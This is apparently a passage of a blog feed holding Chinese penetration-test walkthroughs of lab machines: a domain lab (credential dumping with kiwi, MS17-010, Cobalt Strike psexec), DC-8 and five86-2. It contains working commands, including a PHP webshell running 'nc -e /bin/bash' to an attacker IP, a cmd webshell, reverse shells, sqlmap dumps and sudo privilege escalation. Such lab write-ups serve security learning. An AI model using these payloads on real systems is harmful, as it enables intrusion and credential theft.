class="line">域内五个用户：Administrator、Guest、liukaifeng01、ligang、krbtgt</span><br><span class="line">域内三台主机：OWA（win2k8）、ROOT-TVI862UBEH(192.168.52.141)、STU1(win7)</span><br><span class="line">域控：OWA(192.168.52.138)</span><br><span class="line">win7内网ip：192.168.52.143</span><br><span class="line">------------</span><br></pre></td></tr></table></figure><p>​<img src="/assets/MSFping%E5%9F%9F%E6%8E%A7-20231108132218-3nyd9no.png" alt="MSFping域控"></p><p>​<img src="/assets/MSF%E9%94%81%E5%AE%9A%E5%9F%9F%E5%86%85%E6%88%90%E5%91%98%E4%BA%94%E4%B8%AA-20231108132242-whkn6m9.png" alt="MSF锁定域内成员五个"></p><p>​<img src="/assets/%E6%9F%A5%E8%AF%A2%E5%9F%9F%E5%86%85%E5%85%B6%E4%BB%96%E4%B8%BB%E6%9C%BA-20231108132253-8wmtt46.png" alt="查询域内其他主机"></p><h3 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashdump    ---导出本地用户账号密码，该命令的使用需要系统权限。</span><br></pre></td></tr></table></figure><p>​<img src="/assets/hashdump-20231108133027-38fext2.png" alt="hashdump">​</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#CMD5解密</span><br><span class="line">---#hash解密为空：</span><br><span class="line">---#因为当系统为win10或2012R2以上时，</span><br><span class="line">---#默认在内存缓存中禁止保存明文密码，密码字段显示为null，</span><br><span class="line">---#需要修改注册表等用户重新登录后才能成功抓取。</span><br></pre></td></tr></table></figure><p>​<img src="/assets/CMD5hash%E8%A7%A3%E5%AF%86-20231108133104-en27ea2.png" alt="CMD5hash解密"></p><h3 id="抓取域内账密"><a href="#抓取域内账密" class="headerlink" title="抓取域内账密"></a>抓取域内账密</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#利用msf的kiwi模块+system权限</span><br><span class="line">load kiwi         #加载kiwi模块</span><br><span class="line">help kiwi         #查看kiwi模块的使用</span><br><span class="line">creds_all         #列举所有凭据</span><br><span class="line">creds_kerberos    #列举域内账密 Administrator  admin@123</span><br></pre></td></tr></table></figure><p>​![load kiwi+creds_all](assets&#x2F;load kiwi+creds_all-20231108133200-gn82sit.png)​</p><p>​<img src="/assets/creds_kerberos-20231108133211-anzuniq.png" alt="creds_kerberos">​</p><h3 id="CS上线win7"><a href="#CS上线win7" class="headerlink" title="CS上线win7"></a>CS上线win7</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#楼楼用的是tools的CS</span><br><span class="line">#CS的基本使用楼楼就不做多说明了</span><br><span class="line">#kali机作为服务端，本地win11为客户端</span><br><span class="line">#服务端启动</span><br><span class="line">./teamserver  192.168.43.33 123456 </span><br><span class="line"># 这里的ip是服务端ip，后续客户端连接此ip登录</span><br><span class="line">win11:</span><br><span class="line">直接运行runcatcs.vbs即可（仅限windows），</span><br><span class="line">其他系统执行：java -jar cat_client.jar client</span><br><span class="line"></span><br><span class="line">#设置监听器</span><br><span class="line">#生成木马--&gt;artifactHRmsf.exe</span><br></pre></td></tr></table></figure><p>​<img src="/assets/CS%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC-20231108133648-r9v8i2v.png" alt="CS生成木马">​</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#蚁剑上传artfactHRmsf.exe到win7</span><br><span class="line">#运行木马程序</span><br><span class="line">#CS上线成功</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E8%9A%81%E5%89%91%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC-20231108134053-f4xzd6n.png" alt="蚁剑上传木马">​</p><p>​<img src="/assets/CS%E4%B8%8A%E7%BA%BF%E6%88%90%E5%8A%9F-20231108134100-bg3hmpb.png" alt="CS上线成功"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#简单提权</span><br><span class="line">elevate   ---#提权成功</span><br><span class="line">sleep 1  ---#设置回弹时间间隔</span><br></pre></td></tr></table></figure><p>​<img src="/assets/CS%E6%8F%90%E6%9D%83%E6%88%90%E5%8A%9Fsystem-20231108134147-5lze012.png" alt="CS提权成功system">​</p><h2 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h2><p>为了让 msf 能访问内网的其他主机，即 52 网段的攻击流量都通过已渗透的这台目标主机（Win7）的meterpreter会话来传递，需要建立socks反向代理。</p><h3 id="socket代理"><a href="#socket代理" class="headerlink" title="socket代理"></a>socket代理</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#添加代理</span><br><span class="line">run autoroute -s 192.168.52.0/24  # 添加内网的路由</span><br><span class="line">run autoroute -p                  # 查看路由</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1+%E6%8C%82%E4%B8%8A%E4%BB%A3%E7%90%86-20231108134918-ctqeond.png" alt="添加路由+挂上代理"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#开启代理</span><br><span class="line">background   #将此会话保存为一个sessions</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set VERSION 4a</span><br><span class="line">set SRVPORT 9080</span><br><span class="line">set SRVHOST 127.0.0.1</span><br><span class="line">run</span><br><span class="line">jobs    #运行后挂起一个job</span><br></pre></td></tr></table></figure><p>​<img src="/assets/4a%E4%BB%A3%E7%90%86-20231108134933-aee098e.png" alt="4a代理">​</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#修改配置文件</span><br><span class="line">#在proxychains的配置文件</span><br><span class="line">vim /etc/proxychains4.conf</span><br><span class="line">#添加本机的1080端口：</span><br><span class="line">socks4 127.0.0.1 1080</span><br><span class="line">#ping 域内成员</span><br></pre></td></tr></table></figure><p>​<img src="/assets/1080-20231108135250-okzbhlp.png" alt="1080">​</p><p>​<img src="/assets/proxychains%E9%80%9A-20231108135256-wgbzrxd.png" alt="proxychains通">​</p><h3 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#利用nmap对域内主机进行漏洞扫描</span><br><span class="line">nmap --script=vuln 192.168.52.141</span><br><span class="line">nmap --script=vuln 192.168.52.143</span><br><span class="line">nmap --script=vuln 192.168.52.138</span><br><span class="line">#发现都存在ms17_010漏洞</span><br></pre></td></tr></table></figure><p>​<img src="/assets/nmap+win2k8+win7-20231108140357-x2wdc7i.png" alt="nmap+win2k8+win7">​</p><p>​<img src="/assets/nmap%E6%89%AB%E6%8F%8Fwin2k3-20231108140357-vtjpnio.png" alt="nmap扫描win2k3">​</p><p>​<img src="/assets/win7+msf17-010-20231108140357-6w26su3.png" alt="win7+msf17-010"></p><h3 id="msf利用ms17-010"><a href="#msf利用ms17-010" class="headerlink" title="msf利用ms17-010"></a>msf利用ms17-010</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">search ms17-010</span><br><span class="line">use 2</span><br><span class="line">set RHOST 192.168.52.141/143/138</span><br><span class="line">set COMMAND net user</span><br><span class="line">run</span><br><span class="line">#发现除了win7。win2k3,win2k8都可以利用成功</span><br></pre></td></tr></table></figure><p>​<img src="/assets/138+ms17+rce%E6%88%90%E5%8A%9F-20231108140718-hxtrtdc.png" alt="138+ms17+rce成功">​</p><p>​<img src="/assets/141+ms17+rce%E6%88%90%E5%8A%9F-20231108140718-9zh0we5.png" alt="141+ms17+rce成功">​</p><p>​<img src="/assets/143+win7+%E5%A4%B1%E8%B4%A5-20231108140718-svyszq1.png" alt="143+win7+失败">​</p><h3 id="尝试给域控win2k8添加管理员"><a href="#尝试给域控win2k8添加管理员" class="headerlink" title="尝试给域控win2k8添加管理员"></a>尝试给域控win2k8添加管理员</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#添加管理员</span><br><span class="line">set  COMMAND net user awy233 awy@233 /add</span><br><span class="line">set COMMAND net user</span><br><span class="line">set COMMAND net localgroup administrators awy233 awy@233 /add</span><br><span class="line">set COMMAND net localgroup administrators</span><br><span class="line">#添加成功，但3389毫无反应</span><br></pre></td></tr></table></figure><p>​<img src="/assets/138+%E6%B7%BB%E5%8A%A0awy233%E6%88%90%E5%8A%9F-20231108141028-8dh2qq9.png" alt="138+添加awy233成功">​</p><p>​<img src="/assets/138+%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98+%E6%88%90%E5%8A%9F-20231108141045-ath15ny.png" alt="138+添加管理员+成功">​</p><p>​<img src="/assets/138+%E6%88%90%E5%8A%9F%E6%88%AA%E5%9B%BE%E2%86%90-20231108141045-k9wkw38.png" alt="138+成功截图←">​</p><h3 id="尝试开启域控3389端口"><a href="#尝试开启域控3389端口" class="headerlink" title="尝试开启域控3389端口"></a>尝试开启域控3389端口</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#关闭防火墙</span><br><span class="line">set COMMAND netsh advfirewall set allprofiles state off </span><br><span class="line">#3389</span><br><span class="line">set COMMAND wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 1</span><br><span class="line">set COMMAND REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line">#登不上，不知道为什么</span><br></pre></td></tr></table></figure><p>​![屏幕截图 2023-11-08 141233](assets&#x2F;屏幕截图 2023-11-08 141233-20231108141247-33xzu1g.png)​</p><h2 id="利用SMB-Beacon拿下域控"><a href="#利用SMB-Beacon拿下域控" class="headerlink" title="利用SMB Beacon拿下域控"></a>利用SMB Beacon拿下域控</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#使用条件：</span><br><span class="line">#具有 Beacon 的主机必须接受 445 端口上的连接。</span><br><span class="line">#只能链接由同一个 Cobalt Strike 实例管理的 Beacon。</span><br><span class="line">#必须有目标主机的管理员权限或者说是拥有具有管理员权限的凭据。</span><br><span class="line"></span><br><span class="line">#新建监听器</span><br><span class="line">#payload选择Beacon SMB</span><br><span class="line"></span><br><span class="line">#右键域控，选择psexec攻击</span><br><span class="line">#设置参数</span><br><span class="line"></span><br><span class="line">#成功</span><br></pre></td></tr></table></figure><p>​<img src="/assets/SMB%E7%9B%91%E5%90%AC-20231108142350-jpfr850.png" alt="SMB监听">​</p><p>​<img src="/assets/%E9%80%89%E6%8B%A9%E5%9F%9F%E6%8E%A7-20231108142354-d121qu8.png" alt="选择域控">​</p><p>​![屏幕截图 2023-11-08 142244](assets&#x2F;屏幕截图 2023-11-08 142244-20231108142358-dpyzs40.png)​</p><p><img src="/assets/SMB%E6%94%BB%E5%87%BB%E6%88%90%E5%8A%9F-20231108141835-6lfg4su.png" alt="SMB攻击成功">​<img src="/assets/%E5%85%A8%E9%83%A8%E6%8B%BF%E4%B8%8B-20231108141846-w91phsf.png" alt="全部拿下">​​</p><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 红日靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 转载 </tag>
            
            <tag> 测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC靶机-8</title>
      <link href="/2024/04/11/DC/DC-8/"/>
      <url>/2024/04/11/DC/DC-8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="DC-8"><a href="#DC-8" class="headerlink" title="DC-8"></a>DC-8</h1><p>#主机探测-端口扫描 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line">nmap -F -T4 -sS -sV 192.168.43.12</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D8-a+nmap-20231017175358-gkm2gp5.png" alt="D8-a+nmap">​</p><p>#指纹识别-目录爆破 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://192.168.43.12</span><br><span class="line">dirsearch -u http://192.168.43.12</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D8-what+dir-20231017175409-jzmtkec.png" alt="D8-what+dir">​</p><p>#Web界面-登录界面 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/user/login  --登陆界面</span><br></pre></td></tr></table></figure><p>‍</p><p>#URL存在Sql注入 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首页存在sql注入</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D8-sql-20231017175413-mh1p87c.png" alt="D8-sql">​</p><p>#Sqlmap梭哈-</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">库</span><br><span class="line">sqlmap -u &quot;http://192.168.43.12/?nid=2&quot; --level=5 --risk=3 --batch -D --current-db</span><br><span class="line">表</span><br><span class="line">sqlmap -u &quot;http://192.168.43.12/?nid=2&quot; --level=5 --risk=3 --batch -D &#x27;d7db&#x27; --tables</span><br><span class="line">字段名</span><br><span class="line">sqlmap -u &quot;http://192.168.43.12/?nid=2&quot; --level=5 --risk=3 --batch -D &#x27;d7db&#x27; -T &#x27;users&#x27; --columns</span><br><span class="line">字段</span><br><span class="line">sqlmap -u &quot;http://192.168.43.12/?nid=2&quot; --level=5 --risk=3 --batch -D &#x27;d7db&#x27; -T &#x27;users&#x27; -C &#x27;name,pass,uid&#x27; -dump</span><br><span class="line">#得到的账密保存下来---&gt;mima.txt</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D8-sqlmap%E5%BA%93-20231017175423-qgmpvae.png" alt="D8-sqlmap库">​</p><p>‍</p><p>​<img src="/assets/D8-%E5%AD%97%E6%AE%B5-20231017175437-uvyyxnt.png" alt="D8-字段">​</p><p>​<img src="/assets/D8-%E5%AD%97%E6%AE%B5%E5%90%8D-20231017175437-9gc7b9s.png" alt="D8-字段名">​</p><p>​<img src="/assets/D8-%E8%A1%A8-20231017175437-z44nrya.png" alt="D8-表">​</p><p>‍</p><p>‍</p><p>#john猜解密码 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john mima.txt   ---turtal</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D8-%E4%BF%9D%E5%AD%98%E5%B9%B6john-20231017175454-7zynomy.png" alt="D8-保存并john">​</p><p>#web登录john-写马 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php system(&quot;nc -e /bin/bash 192.168.43.33 8888&quot;);?&gt;</span></span><br><span class="line">#返回主页提交表单</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D8-webshell-20231017175508-b4tjiep.png" alt="D8-webshell">​</p><p>#反弹shell  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kali:</span><br><span class="line">nc -lvvp 8888</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D8-%E5%8F%8D%E5%BC%B9webshell-20231017175517-fsj5ha6.png" alt="D8-反弹webshell">​</p><p>#SUID提权-exim </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">#存在exim</span><br><span class="line">exim --version  --</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D8-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-20231017175524-thdmz10.png" alt="D8-信息收集">​</p><p>#上传46996.sh到靶机 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">searchsploit exim   ---找本地权限提升的脚本,也就是local privilege esc</span><br><span class="line">cp /usr/....../46996.sh .</span><br><span class="line">nc -lnvp 192.168.43.12 2333 &lt; 46996.sh</span><br><span class="line">靶机：</span><br><span class="line">nc 192.168.43.33 2333 &gt; 46996.sh</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D8-exim+sploit-20231017175532-ozzepa3.png" alt="D8-exim+sploit">​</p><p>#运行脚本 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">chmod 777 46996.sh</span><br><span class="line">./46996.sh -m netcat</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D8-%E6%9C%AC%E5%9C%B046996-20231017175545-d1pmfi5.png" alt="D8-本地46996"></p><p>​​<img src="/assets/D8-%E9%9D%B6%E6%9C%BA46666-20231017175556-fbu91w2.png" alt="D8-靶机46666">​</p><p>#FLAG​​</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag.txt</span><br></pre></td></tr></table></figure><p>​![屏幕截图 2023-10-17 170619](assets&#x2F;屏幕截图 2023-10-17 170619-20231017175605-fnb297h.png)​</p><p>​![屏幕截图 2023-10-17 170628](assets&#x2F;屏幕截图 2023-10-17 170628-20231017175610-sq5jn7t.png)​</p><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> DC靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DC靶机 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Five靶机-2</title>
      <link href="/2024/04/11/five/five86-2/"/>
      <url>/2024/04/11/five/five86-2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="five86-2"><a href="#five86-2" class="headerlink" title="five86-2"></a>five86-2</h1><h2 id="主机探测-端口扫描"><a href="#主机探测-端口扫描" class="headerlink" title="#主机探测-端口扫描"></a>#主机探测-端口扫描</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line">nmap -T4 -F -sS -sV 192.168.43.15</span><br></pre></td></tr></table></figure><p>​<img src="/assets/F12-20231024142427-ai0fsj0.png" alt="F12">​</p><h2 id="指纹识别-目录爆破"><a href="#指纹识别-目录爆破" class="headerlink" title="#指纹识别-目录爆破"></a>#指纹识别-目录爆破</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whatweb 192.168.43.15</span><br><span class="line">dirsearch -u 192.168.43.15</span><br></pre></td></tr></table></figure><p>​<img src="/assets/F34-20231024142433-kalzd95.png" alt="F34">​</p><h2 id="wpscan"><a href="#wpscan" class="headerlink" title="#wpscan"></a>#wpscan</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#爆破用户名</span><br><span class="line">wpscan --url http://192.168.43.15 -e u</span><br><span class="line">#爆破密码</span><br><span class="line">wpscan --url http://192.168.43.15 -P /usr/share/wordlists/rockyou.txt  -U use.txt</span><br><span class="line">#得到账密</span><br><span class="line">Username: barney</span><br><span class="line">Password: spooky1</span><br><span class="line">Username: stephen</span><br><span class="line">Password: apollo1</span><br></pre></td></tr></table></figure><p>​![屏幕截图 2023-10-24 115909](assets&#x2F;屏幕截图 2023-10-24 115909-20231024142442-rr6lir0.png)</p><p>​​<img src="/assets/MI%E5%AF%86%E7%A0%81-20231024142452-dl36pyk.png" alt="MI密码">​</p><h2 id="登录web界面"><a href="#登录web界面" class="headerlink" title="#登录web界面"></a>#登录web界面</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#barney spooky1</span><br><span class="line">#可以看到这个站点安装了三个插件，但是只激活了一个Insert or Embed Articulate Content into WordPress Trial（IEAC）</span><br></pre></td></tr></table></figure><p>​<img src="/assets/web-20231024142500-lpq3wj7.png" alt="web">​</p><h2 id="利用插件漏洞"><a href="#利用插件漏洞" class="headerlink" title="#利用插件漏洞"></a>#利用插件漏洞</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#WordPress插件IEAC漏洞分析及组合利用尝试</span><br><span class="line">#https://www.freebuf.com/vuls/205735.html</span><br><span class="line">#该插件主要是可以快速的向文章中嵌入自己的学习内容(e-Learing)，同时该插件可以直接对zip压缩文件进行处理，文件可以先压缩到zip中再一起上传到服务器中。</span><br><span class="line">#生成poc.zip</span><br><span class="line">echo &quot;<span class="tag">&lt;<span class="name">html</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">html</span>&gt;</span>&quot; &gt; index.html</span><br><span class="line">echo &quot;<span class="meta">&lt;?php echo system($_GET[&#x27;cmd&#x27;]); ?&gt;</span>&quot; &gt; index.php</span><br><span class="line">zip poc.zip index.html index.php</span><br><span class="line">#上传POC.zip</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​<img src="/assets/ICEA%E4%B8%8A%E4%BC%A0zip-20231024142510-4feoitf.png" alt="ICEA上传zip">​</p><p>​![屏幕截图 2023-10-24 131528](assets&#x2F;屏幕截图 2023-10-24 131528-20231024142519-uswoghd.png)​</p><p>​![屏幕截图 2023-10-24 131559](assets&#x2F;屏幕截图 2023-10-24 131559-20231024142519-c75zo60.png)</p><p>​​![屏幕截图 2023-10-24 132312](assets&#x2F;屏幕截图 2023-10-24 132312-20231024142535-752sfuo.png)​</p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="#反弹shell"></a>#反弹shell</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#上传EXP.zip</span><br><span class="line">#利用kali自带的php-reverse-shell脚本反弹shell</span><br><span class="line">echo &quot;<span class="tag">&lt;<span class="name">html</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">html</span>&gt;</span>&quot; &gt; index.html</span><br><span class="line">cp /usr/share/webshells/php/php-reverse-shell.php shell.php</span><br><span class="line">zip poc2222.zip index.html shell.php</span><br><span class="line">#kali监听</span><br><span class="line">nc -lvvp 8888</span><br><span class="line">#交互式</span><br><span class="line">pyhton3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>​<img src="/assets/shell--WEB-20231024142547-6up1vz5.png" alt="shell--WEB">​</p><p>​<img src="/assets/%E5%8F%8D%E5%BC%B9shell-20231024142547-cdpn6be.png" alt="反弹shell">​</p><h2 id="切换stephen"><a href="#切换stephen" class="headerlink" title="#切换stephen"></a>#切换stephen</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#信息收集 </span><br><span class="line">ls -ll</span><br><span class="line">sudo -l</span><br><span class="line">id </span><br><span class="line">#发现stephen所属pcap组</span><br><span class="line">进行流量抓包分析</span><br></pre></td></tr></table></figure><p>​![屏幕截图 2023-10-24 134906](assets&#x2F;屏幕截图 2023-10-24 134906-20231024142601-m4mxkkv.png)​</p><p>​![屏幕截图 2023-10-24 134924](assets&#x2F;屏幕截图 2023-10-24 134924-20231024142601-9ny78ba.png)​</p><h2 id="抓包提权"><a href="#抓包提权" class="headerlink" title="#抓包提权"></a>#抓包提权</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#tcpdump -D 即使在低特权下，tcpdump仍具有捕获所有网络浏览的功能</span><br><span class="line"></span><br><span class="line">#检查”veth0c0a6b8”流量，并保存在pcap文件1.pcap</span><br><span class="line">#timeout 120为2分钟，-w将结果输出到文件，-i是指定监听端口</span><br><span class="line">cd /tmp</span><br><span class="line">timeout 120 tcpdump -w 1.pcap -i veth0c0a6b8</span><br><span class="line"></span><br><span class="line">tcpdump -r 1.pcap  </span><br><span class="line">#用-r读取流量包中的数据</span><br><span class="line">#在数据包中找到ftp用户paul    密码是esomepasswford</span><br><span class="line">#切换paul用户，查看sudo权限，paul可以使用peter的service命令</span><br><span class="line">sudo paul</span><br><span class="line">sudo -l</span><br><span class="line">#直接执行peter的/bin/bash，用相对目录找到/bin/bash的位置</span><br><span class="line">sudo -u peter service ../../bin/bash</span><br></pre></td></tr></table></figure><p>​![IP ADDR](assets&#x2F;IP ADDR-20231024142613-hezncwc.png)​</p><p>​<img src="/assets/PAULde%E5%AF%86%E7%A0%81-20231024142623-gt3gcec.png" alt="PAULde密码">​</p><h2 id="FLAG"><a href="#FLAG" class="headerlink" title="#FLAG"></a>#FLAG</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#peter可以运行root用户的passwd命令，直接修改root密码</span><br><span class="line">sudo -u root passwd root</span><br><span class="line">#root</span><br><span class="line">cat /root/thisistheflag.txt</span><br></pre></td></tr></table></figure><p>​<img src="/assets/PAUL-sudo-20231024142635-7iv2vus.png" alt="PAUL-sudo">​</p><p>​<img src="/assets/%E5%88%87%E6%8D%A2peter-20231024142635-a75zadn.png" alt="切换peter">​</p><p>​![屏幕截图 2023-10-24 141217](assets&#x2F;屏幕截图 2023-10-24 141217-20231024142635-fq9vuam.png)​</p><p>​<img src="/assets/%E8%AF%A5%E9%9D%A2%E8%86%9C%E6%8F%90%E6%9D%83-20231024142635-82w8buj.png" alt="该面膜提权">​</p>]]></content>
      
      
      <categories>
          
          <category> Five靶机 </category>
